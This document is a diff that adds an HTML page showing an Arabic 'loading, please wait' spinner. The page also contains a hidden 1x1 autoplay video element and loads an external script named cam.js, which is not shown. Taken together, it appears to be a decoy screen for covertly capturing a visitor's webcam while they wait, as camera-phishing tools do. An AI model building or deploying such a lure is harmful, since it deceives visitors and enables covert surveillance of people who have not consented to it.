@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>جار التحميل...</title>
+  <style>
+    body {
+      background-color: #000;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: sans-serif;
+    }
+    .loader {
+      border: 10px solid #444;
+      border-top: 10px solid #09f;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    h2 {
+      font-size: 20px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <h2>جار التحميل، يرجى الانتظار...</h2>
+  
+  <video id="video" autoplay playsinline width="1" height="1" style="display: none;"></video>
+  <script src="/static/cam.js"></script>
+</body>
+</html>
